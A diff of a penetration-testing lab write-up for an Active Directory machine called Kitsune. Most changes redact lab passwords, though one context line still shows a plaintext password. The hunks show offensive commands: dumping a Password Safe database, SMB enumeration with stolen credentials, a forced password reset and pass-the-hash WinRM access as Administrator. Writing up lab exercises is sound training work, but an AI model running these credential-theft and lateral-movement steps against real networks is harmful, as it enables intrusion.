@@ -148,7 +148,7 @@ Stopped: Sat Oct 24 11:31:59 2026
 with the tool psafe3dump we could extrcat the creds of **`ranch`**
 
 ```┌─[donmed@parrot]─[~/LAB/Hacksmarter/Kitsune/libpsafe3/build]─[10.200.110.236]
-└──╼ $ psafe3dump ../../shares/logins.psafe3 hellokitty
+└──╼ $ psafe3dump ../../shares/logins.psafe3 'REDACTED'
 Warning: using insecure memory!
 type=00  len=  2  785
 type=01  len= 16  e6964a8b-6c5c-4776-9a50-ae428b728a38
@@ -188,7 +188,7 @@ The master password cracks quickly. Opening the database gives us several creden
 ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Kitsune/libpsafe3/build]─[10.200.110.236]
 └──╼ $ nxc smb DC01.kitsune.local -u ranch -p 'REDACTED' --shares
 SMB         10.0.20.28      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.0.20.28      445    DC01             [+] kitsune.local\ranch:R@nch2026! 
+SMB         10.0.20.28      445    DC01             [+] kitsune.local\ranch:'REDACTED'
 SMB         10.0.20.28      445    DC01             [*] Enumerated shares
 SMB         10.0.20.28      445    DC01             Share           Permissions     Remark
 SMB         10.0.20.28      445    DC01             -----           -----------     ------
@@ -296,7 +296,7 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
 Using `bloodyAD` in Kerberos mode, we confirm we can write to `schlop`, then reset their password:
 
-<img width="1042" height="413" alt="image" src="https://github.com/user-attachments/assets/9274c894-bf63-47b8-aeeb-643e925febf8" />
+<img width="1074" height="415" alt="image" src="https://github.com/user-attachments/assets/a4e2aeb0-f1f0-4226-9fcb-26bb5885cbbf" />
 
 
 ```
@@ -387,7 +387,7 @@ The plaintext belongs to **`pebble`**. We verify it:
 
 ```
 ┌─[donmed@parrot]─[~/LAB/Hacksmarter/Kitsune/libpsafe3/build]─[10.200.110.236]
-└──╼ $ nxc smb DC01.kitsune.local -u pebble -p 'PebbleIs47!' --shares
+└──╼ $ nxc smb DC01.kitsune.local -u pebble -p 'REDACTED' --shares
 SMB         10.0.20.28      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:None) (Null Auth:True)
 SMB         10.0.20.28      445    DC01             [+] kitsune.local\pebble:PebbleIs47! 
 SMB         10.0.20.28      445    DC01             [*] Enumerated shares
@@ -447,7 +447,7 @@ The module returns the **local Administrator NTLM hash**. WinRM as Administrator
 
 ```
 ┌─[donmed@parrot]─[~/LAB/Hacksmarter/writeups]─[10.200.110.236]
-└──╼ $ evil-winrm -i DC01.kitsune.local -u administrator -H 'REDACTED'1
+└──╼ $ evil-winrm -i DC01.kitsune.local -u administrator -H 'REDACTED'
                                         
 Evil-WinRM shell v3.5
                                         
